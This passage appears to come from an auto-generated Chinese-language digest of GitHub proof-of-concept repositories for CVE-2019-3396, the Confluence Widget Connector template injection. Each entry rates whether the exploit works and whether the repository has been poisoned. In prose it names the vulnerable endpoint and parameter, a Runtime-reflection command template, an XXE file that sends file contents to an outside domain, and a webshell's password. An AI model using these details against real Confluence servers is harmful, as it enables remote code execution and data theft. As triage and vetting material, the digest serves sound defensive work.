**来源**: [CVE-2019-3396-quanpt103_CVE-2019-3396.md](../2019/CVE-2019-3396-quanpt103_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 小于6.6.12，6.7.0到小于6.12.3，6.13.0到小于6.13.3，6.14.0到小于6.14.2

**利用条件:** 需要 Confluence 实例存在 Widget Connector 宏，且目标版本未修复漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中。攻击者可以利用服务器端模板注入漏洞 (SSTI) 远程执行代码。根据漏洞库信息和搜索结果，该漏洞已经被广泛利用。提供的 POC 代码使用 Velocity 模板语言，尝试通过 `java.lang.Runtime` 类执行 `ipconfig` 命令。该命令本身无害，用于验证漏洞是否存在。由于poc只执行ipconfig命令，没有发现任何投毒代码。利用方式是构造恶意的 Velocity 模板，通过 Widget Connector 宏注入，从而在服务器上执行任意命令。

**项目地址:** [quanpt103/CVE-2019-3396](https://github.com/quanpt103/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #15

**来源**: [CVE-2019-3396-s1xg0d_CVE-2019-3396.md](../2019/CVE-2019-3396-s1xg0d_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence

**危害等级:** 高危，可能导致远程代码执行 (RCE) 和敏感信息泄露

**影响版本:** Confluence Server before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要能够向 Confluence Server 发送 HTTP 请求,并且 Widget Connector 宏可用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2019-3396 是 Atlassian Confluence 中 Widget Connector 宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板代码，利用 Widget Connector 宏的参数，在服务器端执行任意代码。

**有效性评估:**
根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞的POC代码是有效的。Exploit-DB 上的 46731 提供了利用该漏洞的 PoC。搜索引擎结果中也提到多个 PoC 的分析和实际攻击事件。

**投毒风险分析:**
提供的代码包含以下文件：
*   `README.md`: 描述了漏洞 CVE-2019-3396
*   `cmd.vm`: Velocity 模板，用于执行命令。该文件通过 Java 反射调用 `java.lang.Runtime` 来执行系统命令，其中 `$cmd` 变量应该是由攻击者控制的参数。
*   `evil.dtd`: 用于 XXE (XML External Entity) 攻击，尝试通过外部实体引入远程文件。此文件配置为访问 `http://phpshexxe.abcdef.5o1.in/?%file;` 看起来是一个尝试进行数据外泄的 URL
*   `os.vm`: Velocity 模板，用于获取服务器的操作系统信息和用户目录。它使用 Java 反射调用 `java.lang.System` 来获取系统属性。

`evil.dtd` 中的外部连接可能存在一定的风险，可能将服务器的文件内容发送到 `phpshexxe.abcdef.5o1.in`。这是一种潜在的数据泄露尝试。如果攻击者控制了该域名，他们就可以接收到 Confluence 服务器的文件内容。`phpshexxe.abcdef.5o1.in` 这个域名很可疑，具有进行恶意数据收集或攻击的可能性。但此行为更像是payload的一部分而非投毒。所以，投毒的概率相对较低，约为 5%。

**利用方式:**
利用方式主要包括以下步骤：

1.  **构造恶意 Velocity 模板:** 攻击者构造包含恶意代码的 Velocity 模板，例如 `cmd.vm` 中利用 Java 反射执行系统命令的代码。
2.  **利用 Widget Connector 宏:** 攻击者利用 Confluence 的 Widget Connector 宏，将构造好的恶意 Velocity 模板作为宏的参数传递给服务器。
3.  **服务器端执行:** Confluence 服务器解析 Widget Connector 宏时，会执行恶意 Velocity 模板中的代码，从而实现远程代码执行。
4. **XXE攻击:** `evil.dtd`文件可以配合其他payload尝试读取服务器文件，但依赖于服务器是否允许外部实体的解析。

总而言之，该漏洞的利用方式是典型的服务器端模板注入攻击，攻击者通过控制模板内容来执行任意代码。

**项目地址:** [s1xg0d/CVE-2019-3396](https://github.com/s1xg0d/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #16

**来源**: [CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md](../2019/CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md)

## CVE-2019-3396-Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器开启Widget Connector宏功能，并且攻击者能够访问该宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中的一个服务器端模板注入漏洞，存在于Widget Connector宏中。攻击者可以通过构造恶意的Velocity模板代码，利用此漏洞在Confluence服务器上执行任意代码。

**有效性:**
从漏洞库信息和搜索结果来看，此漏洞已被广泛证实存在，并且有公开的PoC（概念验证）代码。
提供的POC代码包含以下文件：
* `README.md`: 说明文件，描述漏洞和PoC的使用方法。
* `_template_test_info.txt`: 用于验证模板是否加载成功的简单文本文件。
* `rce.vm`: 包含Velocity模板代码，用于执行远程命令。
`rce.vm`中使用了Java反射来获取Runtime类，并执行指定的命令。这个PoC代码是有效的，可以用来验证漏洞是否存在。

**投毒风险:**
提供的PoC代码仅包含漏洞验证和利用的必要代码，没有发现任何隐藏的恶意代码或后门。因此，投毒风险为0%。

**利用方式:**
1.  攻击者需要找到一个Confluence页面，该页面使用了Widget Connector宏。
2.  攻击者在Widget Connector宏的配置中插入恶意的Velocity模板代码，例如`rce.vm`中的代码。
3.  当Confluence服务器渲染该页面时，会执行攻击者插入的Velocity模板代码，从而实现远程代码执行。
4.  攻击者可以利用此漏洞在服务器上执行任意命令，例如安装恶意软件、窃取敏感数据等。

**参考信息:**
*   NVD: [https://nvd.nist.gov/vuln/detail/cve-2019-3396](https://nvd.nist.gov/vuln/detail/cve-2019-3396)
*   Rapid7: [https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/](https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/)
*   Exploit-DB: [https://www.exploit-db.com/exploits/46731/](https://www.exploit-db.com/exploits/46731/)
*   CISA KEV: [https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396)

**项目地址:** [skommando/CVE-2019-3396-confluence-poc](https://github.com/skommando/CVE-2019-3396-confluence-poc)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #17

**来源**: [CVE-2019-3396-tanw923_test1.md](../2019/CVE-2019-3396-tanw923_test1.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且允许未授权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞。攻击者可以通过操纵 Widget Connector 宏，注入恶意 Velocity 模板代码，从而在 Confluence 服务器上执行任意代码。

**有效性评估：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断此漏洞利用的有效性较高。漏洞库信息明确指出此漏洞允许远程攻击者通过服务器端模板注入实现路径遍历和远程代码执行。搜索引擎结果中也包含了大量的漏洞分析报告和利用示例，确认了该漏洞在野外已被积极利用，并可能被用于传播勒索软件或恶意挖矿程序。提供的POC代码仓库是一个简单的EXP，说明该漏洞存在可利用的POC.

**投毒风险评估：**

提供的代码片段 `include_1.jsp` 看起来像一个 Webshell，具备文件管理、数据库操作、命令执行等功能。 恶意代码比例较低，因为其本身就是webshell，为了完成漏洞的验证。因此投毒风险评估为 10%，这个比例反映了作者可能隐藏的用于维持权限或进行进一步攻击的代码的可能性，但主要功能是完成POC验证。

**利用方式分析：**

1.  **确定目标：** 找到存在漏洞版本的Confluence Server。
2.  **构造 Payload：** 构建包含恶意 Velocity 模板代码的请求。Payload通常利用`Widget Connector`宏的缺陷，将恶意代码注入到模板中。
3.  **发送请求：** 将构造好的 Payload 发送到目标 Confluence Server，触发模板引擎执行恶意代码。
4.  **远程代码执行：**  成功利用漏洞后，攻击者可以在目标服务器上执行任意命令，例如部署 Webshell、窃取敏感数据或进行其他恶意活动。

提供的`include_1.jsp` 文件实际上是一个后门，攻击者可以通过访问这个JSP页面并提供正确的密码（`xiaoma`）来执行各种操作，例如文件管理、数据库操作、命令执行等。利用漏洞部署webshell后，可以实现对服务器的控制。攻击者可以在服务器上上传、下载、修改和删除文件，查看和修改数据库中的数据，以及执行任意的系统命令。

**项目地址:** [tanw923/test1](https://github.com/tanw923/test1)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #18

**来源**: [CVE-2019-3396-tno01_cve-2019-3396.md](../2019/CVE-2019-3396-tno01_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 < version < 6.13.3, 6.14.0 < version < 6.14.2

**利用条件:** 需要能够访问存在 Widget Connector 宏的 Confluence 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞是 Atlassian Confluence Server 和 Data Center 中的一个服务器端模板注入（SSTI）漏洞。它存在于 Widget Connector 宏中，允许未经身份验证的远程攻击者通过构造恶意的 Velocity 模板，实现路径遍历和远程代码执行。漏洞影响的版本包括 6.6.12 之前的 6.6.x 版本，6.7.0 到 6.12.3 之前的 6.12.x 版本，6.13.0 到 6.13.3 之前的 6.13.x 版本，以及 6.14.0 到 6.14.2 之前的 6.14.x 版本。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞被广泛利用，存在公开的漏洞利用代码（例如 Exploit-DB 46731）。该漏洞已被 CISA 添加到已知被利用的漏洞目录中，表明其真实性和严重性。提供的 POC 代码 `/tmp/deed01dabaaab5a9c3b0b4b4d2014a34/README.md`  内容过于简单,仅包含标题 `# cve-2019-3396`，可能只是一个占位符，说明 POC 是存在的，但**需要结合其他信息确认具体的payload**。

**投毒风险：**

提供的 POC 代码只有一个 README 文件，内容非常简单，几乎没有投毒的可能。但是，完整的漏洞利用代码可能包含恶意代码。因为此README.md文件只是整个POC代码的一个组成部分. 考虑漏洞利用的复杂性和潜在的风险,投毒风险评估为10%。

**利用方式：**

1.  **定位存在 Widget Connector 宏的页面：**  攻击者需要找到 Confluence 实例中使用了 Widget Connector 宏的页面。
2.  **构造恶意 Velocity 模板：**  攻击者构造包含恶意代码的 Velocity 模板。该模板将被注入到 Widget Connector 宏中。
3.  **服务器端模板注入：**  当 Confluence 服务器渲染包含恶意模板的页面时，Velocity 引擎会执行模板中的代码，从而导致服务器端代码执行。
4.  **远程代码执行：**  攻击者通过执行任意代码来控制 Confluence 服务器，可能包括执行系统命令、安装恶意软件等。

根据搜索结果中的一些文章，该漏洞已被用于传播加密货币矿工、GandCrab 勒索软件和 AESDDoS 僵尸网络恶意软件。

**项目地址:** [tno01/cve-2019-3396](https://github.com/tno01/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #19

**来源**: [CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md](../2019/CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.0 - 6.6.11, 6.7.0 - 6.12.2, 6.13.0 - 6.13.2, 6.14.0 - 6.14.1

**利用条件:** 需要能够访问存在漏洞的Confluence服务器，并能够在Confluence页面中插入或修改内容以利用 Widget Connector macro。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector macro 中，允许未经身份验证的远程攻击者通过服务器端模板注入 (SSTI) 执行任意代码。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector macro 渲染该模板，从而在 Confluence 服务器上执行命令。

**有效性：**
根据提供的漏洞信息，搜索引擎结果和漏洞利用代码，可以判断此漏洞是有效的。漏洞库信息明确指出该漏洞允许远程攻击者实现路径遍历和远程代码执行，搜索引擎结果中的文章也表明此漏洞已被积极利用，甚至被用于传播恶意软件。

**投毒风险：**
提供的漏洞利用代码主要包含以下几个文件：
*   `README.md`: 描述文件
*   `cmd.vm`, `cmd1.vm`, `cmd3.vm`: 包含 Velocity 模板代码，用于执行命令。这三个文件除了注释略有不同，核心代码相同。

代码的主要功能是：
1.  获取 Java Runtime 实例。
2.  执行用户提供的命令 (`$cmd`)。
3.  获取命令执行的输出流。
4.  使用 Scanner 读取输出流。
5.  返回命令执行的结果。

投毒风险分析：
由于这些脚本主要是为了执行任意命令，存在被用于恶意目的的风险。例如，攻击者可能会修改这些脚本，使其在执行目标命令的同时，执行一些隐蔽的恶意操作，如安装后门、收集敏感信息等。如果未经授权的人修改或者发布这些脚本，投毒风险就会提升。 总体来说，这些PoC更多的是payload，本身是无害的，风险主要来源于使用它们的人。但作者也可能在代码中隐藏一些不易察觉的后门代码，比如添加一个额外的命令执行，或者上传收集到的信息到恶意服务器。因此，存在一定的投毒风险，估计为 10%。

**利用方式：**
1.  攻击者需要构造包含恶意 Velocity 模板的 Confluence 页面或修改现有页面。
2.  利用 Widget Connector macro 渲染该恶意模板。
3.  恶意模板中的代码会在 Confluence 服务器上执行，从而实现远程代码执行。
4.  `$cmd` 变量需要通过某种方式传递到 Velocity 模板中，例如通过构造特定的请求参数。

总而言之，此漏洞的利用方式是通过构造恶意的Velocity模板，利用Confluence的Widget Connector Macro组件进行渲染，从而达到远程代码执行的目的。

**项目地址:** [vntest11/confluence_CVE-2019-3396](https://github.com/vntest11/confluence_CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #20

**来源**: [CVE-2019-3396-x-f1v3_CVE-2019-3396.md](../2019/CVE-2019-3396-x-f1v3_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Server-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 版本低于 6.6.12，6.7.0 到 6.12.3 之间，6.13.0 到 6.13.3 之间，6.14.0 到 6.14.2 之间

**利用条件:** 需要网络访问到Confluence服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用 Velocity 模板引擎执行任意代码，从而实现远程代码执行。

**有效性：**

提供的POC代码是有效的。它演示了两种利用方式：

*   **远程代码执行（RCE）：** 通过修改`_template`参数，指向包含恶意 Velocity 模板的远程文件（1.vm）。该模板使用`java.lang.Runtime`类执行`ping your.dns.log`命令，可以验证RCE是否成功，同时可以替换成其他的恶意命令。
*   **本地文件包含（LFI）：** 通过修改`_template`参数，指向服务器上的敏感文件，如`../web.xml`，从而读取服务器上的文件内容。

**投毒风险：**

该存储库被投毒的风险较低，约为10%。判断依据如下：

*   仓库本身较为简单，只有一个RCE的vm文件和readme。从代码本身来看，恶意代码的可能性较低。
*   代码片段是直接命令ping，没有很强的迷惑性，因此投毒概率低。
*   参考搜索结果，此漏洞已经被广泛利用，出现恶意利用的情况，但POC本身相对直接。

**利用方式：**

1.  确定目标 Confluence Server 存在 CVE-2019-3396 漏洞。
2.  构造包含恶意 Velocity 模板的 HTTP POST 请求，发送到`/rest/tinymce/1/macro/preview`端点。
3.  在请求体中，设置`macro.params._template`参数为恶意 Velocity 模板的 URL 或目标服务器上的文件路径。
4.  发送请求后，如果漏洞存在，Confluence Server 将执行恶意 Velocity 模板中的代码，导致 RCE 或 LFI。

**示例：**

利用 RCE POC，攻击者可以通过修改 Velocity 模板中的命令，执行任意系统命令，例如上传 webshell、添加用户等。

利用 LFI POC，攻击者可以读取 Confluence Server 上的敏感配置文件，例如数据库连接信息、管理员密码等。

**注意：**

利用此漏洞进行攻击是非法的，仅供安全研究和渗透测试使用。

**项目地址:** [x-f1v3/CVE-2019-3396](https://github.com/x-f1v3/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #21

**来源**: [CVE-2019-3396-xiaoshuier_CVE-2019-3396.md](../2019/CVE-2019-3396-xiaoshuier_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本包括6.6.12之前, 6.7.0 - 6.12.3之前, 6.13.0 - 6.13.3之前, 6.14.0 - 6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏并且允许用户插入恶意模板。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是一个 Atlassian Confluence Server 中的服务器端模板注入漏洞。该漏洞存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板引擎执行任意代码。提供的POC代码使用Velocity模板语言，通过 `java.lang.Runtime` 类执行系统命令。此示例中，POC代码尝试启动 macOS 计算器应用程序。该POC的有效性取决于Confluence服务器上Velocity模板引擎的配置以及是否有安全策略阻止执行任意Java代码。根据搜索结果,此漏洞已被广泛利用,包括部署加密货币挖矿恶意软件和GandCrab勒索软件。

**利用方式：**
攻击者构造包含恶意Velocity模板代码的请求，Confluence服务器解析该模板时会执行攻击者注入的命令。通常是通过修改页面内容，添加包含恶意代码的Widget Connector宏来实现。

**投毒风险评估：**
提供的POC代码本身功能明确，即执行指定的系统命令。其中`/Applications/Calculator.app/Contents/MacOS/Calculator` 这个路径只是一个PoC，用于验证是否存在RCE，如果攻击者将这个路径改成下载恶意软件的命令,这可能会被识别为投毒。 除非攻击者能够找到方法在该POC中隐藏其他恶意行为（例如通过Base64编码或其他混淆技术隐藏反弹shell代码），否则直接的投毒风险较低。但是，攻击者可以修改这个PoC中的执行命令为任意命令，存在一定的投毒风险，所以风险比例为10%。

**项目地址:** [xiaoshuier/CVE-2019-3396](https://github.com/xiaoshuier/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #22

**来源**: [CVE-2019-3396-yuehanked_cve-2019-3396.md](../2019/CVE-2019-3396-yuehanked_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Macro-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 6.6.0 < version < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标系统存在受影响版本的Confluence，并且Widget Connector宏未被禁用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中 Widget Connector 宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector 宏在 Confluence 服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，该漏洞真实存在，且存在公开的PoC。提供的PoC代码 `windows.vm` 利用了 Velocity 模板引擎的特性，通过反射调用 `java.lang.Runtime` 类来执行系统命令。代码首先设置变量`e`为字符串"exp"，然后使用反射获取Runtime类的getRuntime()方法并调用，执行`cmd.exe /c $cmd`。 `$cmd` 变量需要在实际利用时替换为要执行的命令。该PoC代码有效。

**投毒风险分析：**

提供的PoC代码本身的功能是执行任意命令，虽然其中使用了`cmd.exe /c $cmd`，但正常使用该漏洞也需要用户传入执行命令，因此代码的功能就是利用漏洞进行RCE。 但需要评估是否存在作者故意添加的恶意代码，例如：

1.  **隐蔽的后门：** 代码中是否存在难以察觉的命令，用于植入后门或收集信息？
2.  **条件触发的恶意行为：** 代码是否包含在特定条件下才会触发的恶意行为？

假设存在一些不明显的行为（例如每隔一段时间尝试连接某个IP，或者尝试修改某些配置），则投毒风险可能较高。综合考虑POC本身的功能与检查隐藏的恶意行为的难度，评估投毒风险为 10%。

**利用方式分析：**

1.  **查找包含 Widget Connector 宏的 Confluence 页面。**
2.  **构造包含恶意 Velocity 模板的请求。** 这个模板通常会利用 Velocity 的表达式注入功能来执行任意代码。
3.  **发送构造好的请求到 Confluence 服务器。**
4.  **服务器解析 Velocity 模板，执行其中的恶意代码，实现远程代码执行。**

根据搜索结果，该漏洞已经被广泛利用，并且有多种攻击载荷被用于攻击。例如，有攻击者利用该漏洞部署加密货币挖矿程序和 Gandcrab 勒索软件。

**项目地址:** [yuehanked/cve-2019-3396](https://github.com/yuehanked/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

